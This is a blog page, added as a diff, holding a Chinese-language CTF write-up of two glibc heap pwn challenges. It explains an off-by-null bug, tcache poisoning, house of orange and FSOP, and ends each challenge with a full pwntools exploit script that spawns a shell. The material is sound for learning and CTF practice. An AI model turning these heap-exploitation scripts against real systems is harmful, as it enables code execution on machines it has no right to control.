@@ -1,0 +1,421 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>i-SOON_CTF_2021-PWN WP | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="i-SOON_CTF_2021-PWN WP | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="#1 noleak
+这个题需要先通过secret()的检查才能进入到主程序。
+
+可以看出来，就是一个简单的栅栏加密。
+
+
+但是要注意的是，他用的是4个32bit的整数来存，程序使用小端字节序，所以要从最低位开始。
+解密后的结果是
+buf =..." />
+    <meta name="keywords" content="WP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              i-SOON_CTF_2021-PWN WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-22
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/0eC34PvND/" class="post-tag">
+                  # WP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="1-noleak">#1 noleak</h1>
+<p>这个题需要先通过secret()的检查才能进入到主程序。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/e6a7e8e68bb8d.png" alt="1647930375505.png" loading="lazy"></figure>
+<p>可以看出来，就是一个简单的栅栏加密。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/b8d95e537ee55.png" alt="1647930431023.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/c73c27b66af2c.png" alt="1647930513370.png" loading="lazy"></figure>
+<p>但是要注意的是，他用的是4个32bit的整数来存，程序使用小端字节序，所以要从最低位开始。</p>
+<p>解密后的结果是</p>
+<pre><code class="language-python">buf = '\x4e\x30\x5f\x70\x79\x5f\x31\x6e\x5f\x74\x48\x65\x5f\x63\x74\x37'
+</code></pre>
+<p>然后分析每个功能，在edit()中发现了off by null</p>
+<pre><code class="language-c">v0 = read(0, (void *)chunks[2 * v2], LODWORD(chunks[2 * v2 + 1]));
+v3[v0] = 0;
+</code></pre>
+<p>所以可以利用这个溢出的\x00来修改下一个chunk的prev_inuse位，导致前面的chunk被合并，放进unsorted bin，可以leak libc。（house of einherjar）</p>
+<p>（用三个chunk，chunk A, chunk B, chunk C，需要先把chunk A和chunk C的size的tcache装满，然后利用chunk B去off by null改掉chunkC的size）</p>
+<p>我这里是用了两个0x100和一个0x20的chunk来完成的leak libc</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/a466909c4882d.png" alt="1647933829143.png" loading="lazy"></figure>
+<p>因为tcache_entries的检查可以忽略掉，所以根本不需要找符合要求的fake_chunk，写到__malloc_hook就完事了。（比传统的house of spirit还简单）</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/db20eafbb9716.png" alt="1647933978760.png" loading="lazy"></figure>
+<p>直接把one_gadget写进去，就能getshell了。</p>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+elf = ELF('./pwn')
+libc = ELF('./libc.so.6')
+
+p = process(['./pwn'], env={'LD_PRELOAD':'./libc.so.6'})
+
+buf = '\x4e\x30\x5f\x70\x79\x5f\x31\x6e\x5f\x74\x48\x65\x5f\x63\x74\x37'
+p.recvuntil('str:')
+p.sendline(buf)
+
+def choice(idx):
+	p.recvuntil('&gt;')
+	p.sendline(str(idx))
+
+def alloc(idx, sz):
+	choice(1)
+	p.recvuntil('Index?\n')
+	p.sendline(str(idx))
+	p.recvuntil('Size?\n')
+	p.sendline(str(sz))
+
+def show(idx):
+	choice(2)
+	p.recvuntil('Index?\n')
+	p.sendline(str(idx))
+
+def edit(idx, content):
+	choice(3)
+	p.recvuntil('Index?\n')
+	p.sendline(str(idx))
+	p.recvuntil('content:\n')
+	p.sendline(str(content))
+
+def delete(idx):
+	choice(4)
+	p.recvuntil('Index?\n')
+	p.sendline(str(idx))
+
+alloc(0, 0xf0)
+alloc(1, 0x18)
+alloc(2, 0xf0)
+alloc(9, 0x18)
+
+for i in range(7):
+	alloc(i+3, 0xf0)
+for i in range(7):
+	delete(i+3)
+
+delete(0) # ready to leak libc
+pay = p64(0)*2 + p64(0x100+0x20)
+edit(1, pay) # off by null, cancel next chunk's prev_inuse bit
+delete(2)
+alloc(0, 0x110)
+show(0) # leak libc
+
+hook = libc.symbols['__malloc_hook']
+base = u64(p.recv(6) + '\x00\x00') - 0x3afeb0
+print hex(hook + base)
+print hex(base)
+
+# getshell
+delete(1)
+pay = p64(0)*0x1f + p64(0x20) + p64(hook+base) # tcache poisoning
+edit(0, pay)
+
+alloc(2, 0x18)
+alloc(3, 0x18)
+one = [0x41602, 0x41656, 0xdeec2]
+edit(3, p64(one[2]+base))
+
+alloc(4, 0x80)
+
+p.interactive()
+
+</code></pre>
+<h1 id="2-ezheap">#2 ezheap</h1>
+<p>直接分析吧</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/24/f6ae76532a267.png" alt="1648108803907.png" loading="lazy"></figure>
+<p>一开始给了一个堆上的地址</p>
+<p>然后就是菜单流程，但是与众不同的是，只有创建、修改和show的功能，没有free。所以想要用main arena来leak libc就需要用到house of orange来把原来的top chunk放进unsorted bin里。</p>
+<p>比较顺利的是，这题的chng_wp()是很明显存在堆溢出的，所以可以做到house of orange。</p>
+<p>house of orange简单的说，就是利用要申请的chunk size &gt; top chunk size时，原来的top chunk会被放入unsorted bin，然后再使用mmap或者sys_brk申请新的top chunk。</p>
+<pre><code class="language-c">/*
+Otherwise, relay to handle system-dependent cases
+*/
+else {
+      void *p = sysmalloc(nb, av);
+      if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0))
+        alloc_perturb (p, bytes);
+      return p;
+}
+</code></pre>
+<p>要使用sys_brk来扩展堆，还需要注意malloc的尺寸不能大于mmp_.mmap_threshold</p>
+<p>另外，top chunk被放入unsorted bin需要通过glibc的验证：</p>
+<pre><code class="language-c">assert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||
+     ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
+      prev_inuse(old_top) &amp;&amp;
+      ((unsigned long)old_end &amp; pagemask) == 0));
+</code></pre>
+<p>即：</p>
+<p>​	1.伪造的size在内存需要页对齐（对齐0x1000，及4kb）</p>
+<p>​	2.top chunk的size要大于MINSIZE</p>
+<p>​	3.top chunk的size要小于接下来申请的chunk size + MINSIZE</p>
+<p>​	4.prev_inuse bit需要为1</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/5f7bf1e71924c.png" alt="1648558595104.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/cb4585a9acb3b.png" alt="1648558662385.png" loading="lazy"></figure>
+<p>这里我将top chunk改成了0xfc1，申请一个0x1000的chunk触发sys_brk重新分配top chunk，把原来的top chunk放进了unsorted bin，然后再申请一个chunk，就可以把libc上的地址打印下来。（原题house of orange在一开始是没有给出heap地址的，所以原来的做法是申请一个large chunk，让unsorted chunk先把它切割下来在large bin里面过一遍，拿到fd_nextsize作为leak的堆地址）</p>
+<p>但是问题来了，由于不好leak PIE基址，现在该如何getshell呢？</p>
+<p>这里需要用到_IO_FILE的利用方法了。</p>
+<p>在libc2.23以及之前的版本中，vtable是可以被伪造在heap段的，所以这里可以直接在堆里写一个_IO_FILE对象出来，然后再把vtable伪造出来。</p>
+<p>由于malloc报错的时候，会调用_IO_flush_all_lockp这个函数去刷新文件流，这相当于对每一个 _IO_FILE对象调用fflush，进而调用vtable中的 _IO_overflow。而且vtable中的函数指针在被调用时，默认都会将他的对应的 _IO_FILE对象的地址当做第一个参数来传递，这个时候在我们写的那个 _IO_FILE对象的prev_size处写上'/bin/sh\x00'，然后再将 _IO_overflow函数指针劫持到system函数，就能完成getshell了。</p>
+<p>（但是，将对应的 _IO_FILE对象的地址那里改成'/bin/sh\x00'会破坏 _IO_FILE结构中的 _flags成员，就会导致很多函数指针执行前的检查不通过，但是此题环境下的 _IO_flush_all_lockp是可以通过的）</p>
+<p>所有_IO_FILE对象都是由 _IO_list_all这个链表串起来的，所以要使用unsortedbin attack将我们写的这个 _IO_FILE的地址写到 _IO_list_all上去。</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/2a72f5f3b9521.png" alt="1648559752061.png" loading="lazy"></figure>
+<p>这题我伪造好的_IO_FILE和vtable就像这样。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/65f2795630ea5.png" alt="1648559831275.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/29/3bff23688e27d.png" alt="1648559877237.png" loading="lazy"></figure>
+<p>libc2.23中的  _ IO_flush_all_lockp 对_IO_FILE有一些检查，</p>
+<pre><code class="language-c">int
+_IO_flush_all_lockp (int do_lock)
+{
+  ...
+  fp = (_IO_FILE *) _IO_list_all;
+  while (fp != NULL)
+  {
+       ...
+       if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))
+               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
+           {
+               result = EOF;
+          }
+        ...
+  }
+}
+</code></pre>
+<p>也就是：</p>
+<ol>
+<li>
+<p>_IO_write_base &lt; _IO_write_ptr</p>
+</li>
+<li>
+<p>_mode &lt;= 0</p>
+</li>
+</ol>
+<p>另外可以补充一下_IO_flush_all_lockp函数会被调用的场景</p>
+<ol>
+<li>当libc执行abort流程时</li>
+<li>当执行exit函数时</li>
+<li>当执行流从main函数返回时</li>
+</ol>
+<pre><code class="language-python">from pwn import *
+context.log_level='debug'
+elf = ELF('./pwn')
+libc = ELF('./libc-2.23.so')
+p = process('./pwn')
+
+def choice(idx):
+	p.recvuntil('choice : ')
+	p.sendline(str(idx))
+
+def create(sz, content):
+	choice(1)
+	p.recvuntil('size of it')
+	p.sendline(str(sz))
+	p.recvuntil('Name?')
+	p.sendline(content)
+
+def edit(sz, content):
+	choice(2)
+	p.recvuntil('size of it')
+	p.sendline(str(sz))
+	p.recvuntil('name')
+	p.sendline(content)
+
+heapbase = int(p.recvline()[2:-1], 16) &amp; 0xfffffffffffff000
+print(hex(heapbase))
+create(0x18, 'DDDD')
+pay = b'a'*0x18 + p64(0xfc1)
+edit(len(pay), pay)
+
+create(0x1000, 'hacked by k')
+create(0x400, 'AAAAAAA')
+choice(3)
+p.recvuntil('AAAAAAA\n')
+libcbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) - 0x3c5188
+sys = libcbase + libc.symbols['system']
+io_list_all = libcbase + libc.symbols['_IO_list_all']
+# print(hex(libcbase))
+# fsop
+pay = cyclic(0x400)
+pay += b'/bin/sh\x00' + p64(0x61) + p64(0) + p64(io_list_all-0x10) # unsortedbin atk
+pay += p64(0) + p64(1)
+pay = pay.ljust(0x4d8, b'\x00')
+pay += p64(heapbase+0x520)
+pay += p64(0) + p64(sys)
+
+edit(len(pay), pay)
+choice(1)
+p.recvuntil('size of it')
+p.sendline('24')
+
+p.interactive()
+
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#1-noleak">#1 noleak</a></li>
+<li><a href="#2-ezheap">#2 ezheap</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/模拟退火算法/">
+              <h3 class="post-title">
+                模拟退火算法
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
